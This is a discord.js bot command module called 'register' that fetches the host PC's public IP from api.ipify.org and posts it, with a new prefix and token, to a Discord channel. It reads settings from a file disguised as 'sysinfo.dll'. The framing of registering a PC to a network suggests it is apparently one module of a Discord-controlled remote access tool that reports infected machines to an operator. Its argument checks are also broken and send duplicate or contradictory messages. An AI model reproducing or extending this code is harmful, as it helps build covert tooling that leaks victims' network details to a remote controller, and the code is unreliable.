const Discord = require('discord.js')
const fs = require('fs')

module.exports = {
    name: "register",
    description: "Registers PC to Network and new token and prefix",
    execute(message, client, args) {
        const https = require('https')
        const options = {
            hostname: 'api.ipify.org',
            port: 443,
            path: '/',
            method: 'GET'
        }

        const req = https.request(options, res => {
            res.on('data', ip => {
                let sysinfo = fs.readFileSync('./sysinfo.dll').toString().split('--')

                if (args[0] == undefined) {
                    const registerembed = new Discord.MessageEmbed()
                        .setColor(`RANDOM`)
                        .setTitle(`💻 Error`)
                        .addFields({
                            name: '**You need to define the prefix and or the token**',
                            value: `eg. ${sysinfo[1]}`,
                            inline: true
                        })
                        .setTimestamp();

                    message.channel.send({
                        embeds: [registerembed]
                    })
                }

                if (args[1] == undefined) {
                    const registerembed = new Discord.MessageEmbed()
                        .setColor(`RANDOM`)
                        .setTitle(`💻 Registered!`)
                        .addFields({ name: '**IP Address**', value: `${ip}`, inline: true }, { name: '**New Prefix**', value: `${args[0]}`, inline: true }, { name: '**New Token**', value: `${args[1]}`, inline: true })
                        .setTimestamp();

                    message.channel.send({
                        embeds: [registerembed]
                    })
                }

                const registerembed = new Discord.MessageEmbed()
                    .setColor(`RANDOM`)
                    .setTitle(`💻 Registered!`)
                    .addFields({ name: '**IP Address**', value: `${ip}`, inline: true }, { name: '**New Prefix**', value: `${args[0]}`, inline: true }, { name: '**New Token**', value: `${args[1]}`, inline: true })
                    .setTimestamp();

                message.channel.send({
                    embeds: [registerembed]
                })
            })
        })

        req.on('error', error => {
            console.error(error)
        })

        req.end()
    }
}